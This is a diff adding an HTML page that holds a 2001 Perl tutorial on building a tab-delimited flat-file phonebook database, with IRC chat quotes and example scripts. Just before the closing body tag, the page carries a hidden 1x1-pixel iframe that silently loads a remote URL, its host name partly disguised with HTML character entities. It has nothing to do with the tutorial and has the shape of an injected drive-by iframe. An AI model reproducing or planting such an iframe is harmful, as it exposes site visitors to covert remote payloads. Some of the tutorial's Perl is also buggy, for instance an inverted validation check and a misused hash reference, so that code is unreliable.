@@ -1,0 +1,774 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<html>
+<head>
+	<title>Flat Databases in Perl</title>
+</head>
+<body>
+<table width="800">
+	<tr>
+		<td width="800" halign="left">
+		<font face="courier new, verdana">
+<h1>Flat databases in Perl</h1>
+<h3><i>By QX-Mat</i></h3>
+<hr noshade>
+URL:<br>
+<blockquote>
+http://blacksun.box.sk<br>
+http://my-security.net/hosting<br>
+</blockquote>
+IRC:
+<blockquote>
+irc.box.sk / #bsrf<br>
+irc.turbo-irc.net / #turbo-irc<br>
+</blockquote>
+<hr noshade>
+We all love IRC, so why not come by and say hi sometimes :)
+
+<font color="#969696">
+<pre>
+- IRC irc.box.sk / #bsrf
+[Matt] Hey folks, would anyone like to say something for the perl flat db tut?
+[Matt] I'll quote you :)
+[@AZTEK] perl rules
+[@AZTEK] :)
+[Matt] Thanks Az :)
+</pre>
+</font>
+<h3>Aim:</h3>
+I aim to give a good overview, and insight, into making good flat database structures in perl without too much hassle. I will be using a telephone database as an example.<p>
+
+The following fields will be used:<br>
+<ul><li>ID</li><br>
+<li>Name</li><br>
+<li>Address</li><br>
+<li>Telephone number</li></ul><p>
+
+<b>Note:</b> You will require an intermediate perl skill level.<br>
+
+<b>Tip:</b> the correct database terminology for a 'data section is a field. 'Rows' in a database are considered 'records'.<p>
+
+<h3>What are flat databases?</h3>
+
+<font color="#969696">
+<pre>
+- IRC irc.box.sk / #bsrf
+[Matt] anyone got anything to say about the use of flat databases?
+[@AZTEK] they are a cheaper way to store your data
+[Matt] great :)
+[@AZTEK] lol
+</pre>
+</font><p>
+A flat database is a database within a single file. A database is a set of data within a structure (in memory or a file, for example). All data stored in a database, is stored within validity constraints - that, in simple terms, means the data stored, is validated, and only stored if it passes a validation check.<p>
+Against popular belief, flat databases can be linked to another database, or joined; but for this tutorial, I will cover flat databases, without joining, in perl.<p>
+
+<h3>Validation:</h3>
+Data must be checked before it can be stored in a 'good' database. If you have an input string, and you require this input string to be numerical, like a telephone number for example, you would use the following expression:<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana"><center>
+print "the data is not a number" unless (/^\d+$/);
+</center></font>
+</td></tr></table></td></tr></table><p>
+
+<b>Perl:</b> \d is the numerical regex operator in perl. If this returns false, then the unless condition will 'run' the print statement.<p>
+
+This can be extended further, to include spaces, and brackets, as most telephone numbers require an international dialing code.<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana"><center>
+print "the data is not a valid telephone number" if (/[^\d|\+| |\(|\)]/);
+</center></font>
+</td></tr></table></td></tr></table><p>
+
+<b>Perl:</b> in regular expressions, [ ], delimit individual comparisons, and the pipe character (|) separates these. The caret means 'not'. Here you could use the hex equivalent of 'space' if wanted.<p>
+
+To put this 'data validation' into action, the following script my help you:<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre><xmp>
+
+#!/usr/bin/perl
+# fdb_validation1.pl
+#
+# Simple data validation in perl
+
+print "Simple data validation\n", '-' x 22 . "\n", "Hit CTRL-C to exit\n\n";
+
+while(<STDIN>) {
+	unless (/[^\d|\+| |\(|\)]/) {
+		print "The input is not a valid telephone number\n\n";
+	} else {
+		chomp;
+		print "Great! $_,  is a proper telephone number!\n\n"	
+	}
+}
+</xmp>
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+<b>To sum up:</b> validation checks to see if data entered is of the correct type. Proper databases should run a validation check on all input.<p>
+ 
+<h3>Storing databases:</h3>
+I'm going to cover the theory to storing a flat database first, because it's the most important to understand, and it introduces you to storage concepts.<p>
+
+We know that validation checks to see if data is ok, but we don't know how to store information in a flat database. A structured (aka 'active' or 'online') database will store data in memory, and to disk. We do not have the option of storing to memory, because we are using a flat, offline, database. Therefore, the entire database state, should be stored to file after being modified.<p>
+
+When storing to file, we need a method of storing the data so it can be read again. If the data cannot be read correctly, then there is no reason in storing it. There are two used methods of storing data.<p>
+
+<b>- Chunks:</b>
+<blockquote>
+Chunks of data are often the fastest method of saving data, because they do not require any conditional formatting. A section of a 'chunk database' may look like the following:<br>
+<blockquote>
+29
+data
+data
+more data
+even more data
+</blockquote><p>
+Each field is on it's own line, and each line has a carriage return directly after the end of the data. If there is no data, where data should be stored, a carriage return is still used to 'hold' the database structure. The records are stored in lines of 5. In code, a data chunk is often referenced as an array, for example,
+</blockquote>
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana"><center>
+my @current_chunk = @db_lines[10..15];
+</center></font>
+</td></tr></table></td></tr></table><p>
+<blockquote><p>
+Here, 5 lines from 10 to 15 are stored in the array, <i>@current_chunk</i>. Obviously you can then access fields (when knowing the format), with <i>$current_chunk[3];</i><p>
+
+You may wish to use chunks in your database if: 1) you want speed, and 2) you wish to use less regular expressions when retreiving from the database.
+</blockquote>
+<b>- Rows:</b><br>
+<blockquote>
+  This is the most popular method of storing data. A line from a flat database might look like:<p>
+<blockquote>
+29:data:data:more data:even more data
+</blockquote><p>
+This method is popular because, 1) it is easier to handle with loops, and 2) it is easier to read by sight. Here, the fields are separated by colons (:). Records are separated by carriage returns.<p>
+For this tutorial, we're going to use the latter - sounds a little more complicated? Well, maybe it sounds so, but it's not really :)<p>
+</blockquote>
+<h3>Reading a database in code:</h3>
+There are now two ways you can go about reading a database, you can: a) read into an array and loop to use, or b) read into a hash, loop to use, or require a key to use. We're going to cover the latter, as I believe hashes are such a magnificent thing not to waste.<p>
+
+<b>Perl:</b> check perldoc's hashref before proceeding, as it's very important one knows the difference between a hashref and a hash. Even I slip up sometimes.<p>
+<b>Opening, storing, and closing a file:</b><p>
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+<xmp>
+open(DATA, "filename") or die "Sorry, I could not open the specified file because: $!";
+	my @filelines = <DATA>;
+close(DATA);
+
+Ok, thats the easy bit to opening a file, but, lets make it a little more fool proof :)
+
+my @db_lines;
+
+if (-e $db_file) {
+	open(hDB, $db_file) or die "Sorry, we couldn't open the file specified: $";
+	@db_lines = <hDB>;
+	close(hDB);
+}
+</xmp>
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+<blockquote>
+The advantage of this, is that the script will not die on first use, because of the '-e'xist condition. Should you wish, you can add your own else statement and touch the file, but you'll not need to do this as the write function later offers an alike process when it unconditionally appends.<p>
+</blockquote>
+<b>- Splitting delimited lines:</b>
+<blockquote>
+In the examples above, I used, :, as a line delimited. This is not a good choice, as some input may use a colon and end up 'shifting the data'. So for posterity, and 'because I can', I'm going to use the tab character, \t. Lets have a look at one of those lines again.<p>
+</blockquote>
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana"><center>
+29:data:data:more data:even more data
+</center></font>
+</td></tr></table></td></tr></table><p>
+<blockquote>
+would now be,<br>
+</blockquote>
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana"><center>
+29	data	data	more data	even more data
+</center></font>
+</td></tr></table></td></tr></table><p>
+</blockquote>
+<b> - Parsing:</b><p>
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana"><center>
+($data1, $data2, $data3, $data4, $data5) = split("\t", "29	data	data	more data	even more data");
+</center></font>
+</td></tr></table></td></tr></table><p>
+<blockquote>
+That was easy wasn't it? Lets add the last to sections of code together and see what we get :)
+</blockquote>
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+<xmp>
+my @db_lines;
+
+if (-e $db_file) {
+	open(hDB, $db_file) or die "Sorry, we couldn't open the file specified: $";
+	@db_lines = <hDB>;
+	close(hDB);
+
+	foreach $db_line (@db_lines) {
+		chomp;
+		my ($data1, $data2, $data3, $data4, $data5) = split("\t", $db_line);
+
+		# We deal with the values from the file here :)
+	}
+}
+</xmp>
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+<b>- Hash'ed :)</b><p>
+<blockquote>
+I mentioned that we were going to use hashes earlier. Just to recap on them, as I assume no one read the hashref perldoc, a hash is an associative array. This means, a hash can old arrays within itself access them by association. <i>hashref </i>talks about the simple issue you need to understand: hashes can only hold scalars arrays! But this isn't to limit our work in anyway, as a reference is also a scalar. A reference, for those that don't understand pointer concepts is as follows:
+</blockquote><p>
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+
+$ascalar = "this is a scalar"; # set
+$another = $ascalar;           # copied
+$yetanother = \$ascalar;       # referenced
+
+print $ascalar;    # ok
+print $another;    # ok
+print $yetanother; # NNOOOOO!
+
+print ${$yetanother};   # great!
+print $$yetanother;	    # simplified
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+<blockquote>
+A reference is a pointer, much alike those used in C. (but references in C start with an amperstand, [&] and pointers with an asterisk [*], just to confuse you :) It points, or references, a memory location that the compiler must be told to 'use' correctly. If it is not told that the place is an area of  memory, it won't be treated like one, and end up printing the 'location' it points to, rather than the locations content.<p>
+
+When learning BBC basic, I remember variables and pointers much like a mail sorting office, where they have rows and rows of boxes, each of these boxes with a number - this is the 'key' to locating them. Within the box is the data stored (an envelope).<p>
+
+When we use, <i>${ scalar }</i>, we tell the interpreter that the data is a reference, and it must then get the data from that reference in memory, and use that when called on. It is also possible to to use @$scalar, if $scalar is a reference to a memory space where an array is stored.<p>
+
+That's a lot of recapping on hashes, now, how to use them.<p>
+</blockquote><p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+
+my %hash; # this is a hash.
+
+my $hashref = \%hash; # this is a reference to that hash
+
+$hashref{'key'} = "value"; # this is setting a key, and a value pair.
+
+print $hashref{'key'}; # this prints the value of key (which would be "value")
+
+my @array = ('29', 'data', 'data', 'more data', 'even more data'); # makes an array called array
+
+$hashref{'array'} = \@array; # sets the key 'array', to a REFERENCE of an array with our data
+
+foreach $value (@{$hashref{'array'}}) { print "$value\n"; } # loops and prints each element of this new array stored in the hash.
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+<blockquote>
+That sounds easy enough, so, using a unique value in our database as a key, we should be able to create a hash holding our details... lets see!
+</blockquote><p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+<xmp>
+
+my @db_lines;
+my %database;
+my @validation = ('NUM', 'TEXT', 'TEXT', 'TEXT', 'TELEPHONE');
+
+my $db_file = "database.txt";
+my $sep = '|';
+
+if (-e $db_file) {
+	open(hDB, $db_file) or die "Sorry, we couldn't open the file specified: $_";
+	@db_lines = <hDB>;
+	close(hDB);
+
+	foreach $db_line (@db_lines) {
+		chomp $db_line;
+		my @record = split($sep, $db_line);
+
+		if (&chk_validation(@record) == 1) {
+			die "Sorry, there was an error parsing the database input :(";
+		}
+		$database{$record[0]} = [@record[1..$#record]];	
+	}
+}
+
+sub chk_validation {
+	my @arraytocheck = @_;
+	my $pos = 0;
+
+	foreach $value (@arraytocheck) {
+		if ($validation[$pos] eq 'NUM') {
+			return 1 if ($value !~ /^\d+$/); # return a non 0
+		} 
+		
+		if ($validation[$pos] eq 'TELEPHONE') {
+			return 1 if ($value =~ /[^\d|\+| |\(|\)]/);
+		}
+		# We don't care about text :)	
+		$pos++;
+	}
+	return 0;
+}
+</xmp>
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+<blockquote>
+Here, I have added the subroutine, <i>chk_validation</i>. <i>chk_validation</i> will check to see if the elements in the parsed line fit with the conditions in the array <i>@validation</i>. Perl does not have a switch statement, but it would be handy right now. If you don't understand it, and know your biology, think of it as a ribosome translating rDNA, but if it finds something that doesn't match, it throws an error.
+</blockquote>
+</blockquote>
+ 
+<h3>Writing to a flat database</h3>
+
+We know how information is stored and read, so lets write ours in the same format. This is rather easy, compared to most of the validation... here we go.<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+<xmp>
+sub write_entry {
+	my ($forename, $surname, $city, $telephone) = @_;
+
+	my $cid = scalar keys %database;
+
+	open(OUT, '>>' . $db_file) or die "Sorry, we could not open the database for writing, $!";
+	print OUT $cid . $sep . $forename . $sep . $surname . $sep . $city . $sep . $telephone . "\n";
+	close(OUT);		
+}
+</xmp>
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+That was easy, but lets add some taint checking and replacing - I shall explain. If I want to use either the tab character (\t) or the pipe character, or even the colon character to delimit fields in the database, I need to replace them in user input. Should someone use that character in a text field, where it is allowed, then the data when parsed will be split at the wrong point. To demonstrate this using spaces, try the following:<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+<xmp>
+#!/usr/bin/perl
+# fdb_taint1.pl
+#
+# Breaking 'data' in perl
+ 
+my @result;
+my $input 	= '3 ';    # note the extra space after the 3
+my $line 	= "1, 2, $input, 4, 5";   # note no 3, rather $input
+
+@result = split(' ', $line);
+
+foreach (@result)  { print "= $_\n"; }
+</xmp>
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+In this example, the script should print = 1, .. = 5, but fails to do so because there is an extra space after 3 on the 'input' variable. If this was the telephone directory, and we tried to refer to <i>$result[3]</i>, then you'd find the variable would not be there - instead, that extra space would have nudged all sequencial variables up a place... probably causing havoc, and even data loss - especially if we used:<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana"><center>
+my ($data1, $data2, $data3, $data4, $data5) = @array; # there is no $data6, therefore it's been nudged, and lost
+</center></font>
+</td></tr></table></td></tr></table><p>
+
+So how do I fix this kind of problem? By replacing! Since we know we don't want extra septerators, we could can a hidden character no one knows about, or we can use a 'word' replacement, and fix it back a little later. Using a 'word' is preferred, as it leaves no room for accidental errors... Lets have a look:<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+<xmp>
+
+sub write_entry {
+	# my apologies if there is an easier way of doing this?
+	my $i = 0;
+	my $value;
+	foreach $value (@_) {
+                @_[$i] = $value if (s/$sep/__BAR__/ig);
+		$i++;
+	}
+	my ($forename, $surname, $city, $telephone) = @_;
+
+	my $cid = scalar keys %database;
+
+	open(OUT, '>>' . $db_file) or die "Sorry, we could not open the database for writing, $!";
+	print OUT $cid . $sep . $forename . $sep . $surname . $sep . $city . $sep . $telephone . "\n";
+	close(OUT);		
+}
+</xmp>
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+We'll also need a modification to the read function to reverse the process:<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+
+if (-e $db_file) {
+	open(hDB, $db_file) or die "Sorry, we couldn't open the file specified: $_";
+	@db_lines = <hDB>;
+	close(hDB);
+
+	foreach $db_line (@db_lines) {
+		chomp $db_line;
+		my @record = split($sep, $db_line);
+
+		my $i = 0;
+		my $value;
+		foreach $value (@record) {
+               		@record[$i] = $value if (s/__BAR__/$sep/ig);
+			$i++;
+		}
+
+		if (&chk_validation(@record) == 1) {
+			die "Sorry, there was an error parsing the database input :(";
+		}
+		$database{$record[0]} = [@record[1..$#record]];	
+	}
+}
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+<h3>Searching through your database</h3>
+
+This is where our hash information comes into play, but not as evidently as I demonstrated. To search our hash, we need to exact the key and value pair. Because Perl is so wonderful, it has a lovely operator called 'each' - lets have a look:<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+<xmp>
+sub search {
+	my ($term) = @_;
+	while (my ($key, $value) = each(%database)) {
+		foreach (@{$value}) {
+			return $key if (/$term/i);
+		}
+	}
+	return undef;
+}
+</xmp>
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+This function will return undef if no match is found. It's also case insensitive. Also, this is where our hash tuition comes into play - if you remember, I said a hash holds an array of scalars (or pointers!). Since the value of the key is <i>$value</i>, <i>$value</i> at any point would be exactly the same as <i>$database{$key}</i>, therefore, we simply reference it as an array with <i>@{$value}</i>, and do away with <i>@{$database{$key}}</i>.<p>
+
+<h3>Finishing off</h3>
+
+We've now covered everything we need to make the database backend to an interactive phonebook database system.<p>
+
+Some differences:<br>
+<ul>
+<li>I have used the tab character to delimit the database</li>
+<li>I have added a menu system</li>
+<li>I have added an addition system</li>
+</ul><p>
+
+So, without further ado, lets produce the final script...<p>
+
+<table width="750" bgcolor="gray" cellpadding="1" cellspacing="1" align="center"><tr><td><table width="750" bgcolor="silver"><tr><td>
+<font face="courier new, verdana">
+<pre>
+<xmp>
+
+#!/usr/bin/perl
+# fdb_phonebook.pl
+#
+# DESC: A flatfile database phone book by Matt 'QX' Melton
+# HTTP: http://blacksun.box.sk
+# DATE: 25/10/01
+
+# LNCE: You may not use this on your own site without pior permission
+
+@validation = ('NUM', 'TEXT', 'TEXT', 'TEXT', 'TELEPHONE');
+$db_file 	= "database.txt";
+$sep		= "\t";
+
+&load_database;
+&main_menu;
+exit;
+
+# ---------------------------------------------------------------------
+
+##
+## Display the main menu, and prompts for input
+##
+sub main_menu {
+
+my $main_screen = <<END;
+ The Phone book - by Matt
+--------------------------
+
+What you you like to do:
+	1) Add a new entry
+	2) Display an entry
+	3) Search for an entry
+
+	x) Exit
+
+END
+
+        # 1st timers...
+        print $main_screen;
+        print "\t=";
+       
+	while ($choice = <STDIN>)  {
+		chomp $choice;
+		exit if ($choice eq 'x');
+		&add_entry if ($choice eq '1');
+		&show_entry if ($choice eq '2');
+		&search_entry if ($choice eq '3');
+
+		# Returns WIN32 usually, but you can never be
+		# too sure with NT and 2K :)
+		if ($^O =~ /WIN/i) {
+			system('cls');			
+		} else {
+			system('clear');
+		}
+
+		print $main_screen;
+		print "\t=";
+	}
+
+}
+
+# 
+# Prompts for new data input and validates, then runs write_entry
+#
+sub add_entry {
+	my @newrecord;
+	print "Forename: ";
+        my $forename = <STDIN>; chomp $forename; 
+	print "Surname: ";
+        my $surname = <STDIN>; chomp $surname; 
+	print "City: ";
+        my $city = <STDIN>; chomp $city;
+	print "Telephone number: ";
+        my $telephone = <STDIN>; chomp $telephone;
+
+	if (&chk_validation(0, $forename, $surname, $city, $telephone) == 1) {
+		print "Data entered was not valid. Please try again\n\n";
+		print "\n Entry NOT added.\n\nHit any key to continue...\n";
+		my $null = <STDIN>;
+		return;
+	}
+
+	&write_entry($forename, $surname, $city, $telephone);
+
+	print "\n Added entry.\n\nHit any key to continue...\n";
+	my $null = <STDIN>;
+
+	return;
+}
+
+#
+# Prompts for key, then runs display_entry
+#
+sub show_entry {
+	print "Entry key number: ";
+	my $key = <STDIN>; chomp $key;
+	print "\n";
+
+	&display_entry($key);
+
+	print "\nHit any key to continue\n";
+	my $null = <STDIN>;
+}
+
+#
+# Retrieves records, checks for existance, then displays
+#
+sub display_entry {
+	my ($key) = @_;
+
+	my $record = $database{$key};
+
+	if ($record == undef) {
+		print "That record does not exist\n";
+		return;
+	}
+
+	print "ID........... $key\n";
+	print "Name......... $$record[0]\n";
+	print "Surname...... $$record[1]\n";
+	print "City......... $$record[2]\n";
+	print "Telephone.... $$record[3]\n";
+
+}
+
+#
+# Prompts for search term, runs the search sub, display entry if only 1, or displays
+# entry keys if more
+#
+sub search_entry {
+ 	print "Please type the search phrase [Name, partial number]: ";
+	my $term = <STDIN>;
+	chomp $term;
+	print "\n";
+
+	my ($matches) = &search($term);
+
+	if (@$matches == undef) {
+		print "Sorry, no matches found\n\nHit any key to continue...\n";
+		my $null = <STDIN>;
+		return;
+	}
+
+	if ($#$matches == 1) {
+		print "Found one matching entry:\n";
+		&display_entry($$matches[1]);
+		print "\nHit any key to continue.\n";
+		my $null = <STDIN>;
+		return;
+	}	
+
+	print "Found " . $#$matches . " matching entries: " . substr(join(', ', @$matches), 2) . "\n\nHit any key to continue...\n";
+	my $null = <STDIN>;
+}
+
+#
+# If the db file exists, it will read it and split the lines into records, and then
+# fields. The adds to $database hash
+#
+sub load_database {
+	if (-e $db_file) {
+		open(hDB, $db_file) or die "Sorry, we couldn't open the file specified: $_";
+		@db_lines = <hDB>;
+		close(hDB);
+
+		foreach $db_line (@db_lines) {
+			chomp $db_line;
+			next if $db_line eq "";
+			my @record = split(/$sep/, $db_line);
+
+			my $i = 0;
+			my $value;
+			foreach $value (@record) {
+               		@record[$i] = $value if (s/__BAR__/$sep/ig);
+				$i++;
+			}
+
+			if (&chk_validation(@record) == 1) {
+				die "Sorry, there was an error parsing the database input :(";
+			}
+                  $database{$record[0]} = [@record[1..$#record]]; 
+		}
+	}
+}
+
+#
+# Concurrently parses the records with the array @validation
+# returns 1 if there is a validation error
+#
+sub chk_validation {
+	my @arraytocheck = @_;
+	my $pos = 0;
+
+	foreach $value (@arraytocheck) {
+		if ($validation[$pos] eq 'NUM') {
+			return 1 if ($value !~ /^\d+$/); # returns the value 1
+		} 
+		
+		if ($validation[$pos] eq 'TELEPHONE') {
+			return 1 if ($value =~ /[^\d|\+| |\(|\)]/);
+		}
+		# We don't care about text :)	
+		$pos++;
+	}
+	return 0;
+}
+
+
+#
+# Parses, replaces, the $sep character in a string and prints to the end of the db file
+#
+sub write_entry {
+	my $i = 0;
+	my $value; 
+
+	# my apologies if there is an easier way of doing this
+	foreach $value (@_) {
+      	@_[$i] = $value if (s/$sep/__BAR__/ig);
+		$i++;
+	}
+
+	my ($forename, $surname, $city, $telephone) = @_;
+
+	my $cid = (scalar keys %database) + 1;
+
+	open(OUT, '>>' . $db_file) or die "Sorry, we could not open the database for writing, $!";
+	print OUT $cid . $sep .  $forename . $sep . $surname . $sep . $city . $sep . $telephone . "\n";
+	close(OUT);		
+
+	&load_database; 	# reload the db, but we could do it straight to the array, but it'd be
+				# an active memory db and not a flat file one :)
+}
+
+#
+# Cycles each key/value pair and sees if they match the term, if so, adds to array and
+# returns list of matches
+#
+sub search {
+	my ($term) = @_;
+	my @found = undef;
+	while (($key, $value) = each(%database)) {                
+                foreach $field (@{$value}) {
+                        push (@found, $key) if ($field =~ /$term/i);
+		}
+	}
+	return undef if ($#found == 0);
+	# else
+	return \@found;
+}
+</xmp>
+</pre>
+</font>
+</td></tr></table></td></tr></table><p>
+
+<h3>Parting quotes:</h3>
+<font color="#969696">
+<pre>
+[@AZTEK] i have to admit
+[@AZTEK] us americans are greedy bastards :)
+[Matt] quoted :)
+[@AZTEK] i am glad thats going into the tutorial and not any of my relevant answers :)
+[Matt] anyone bar Az want to say anything before I finish it?
+...
+[Matt] right, I'll go watch Sabrina then
+</pre>
+</font><p>
+
+QX-Mat - 28/10/2001 - matt@guysjs.org		
+		</font>
+		</td>
+	</tr>
+</table>
+
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
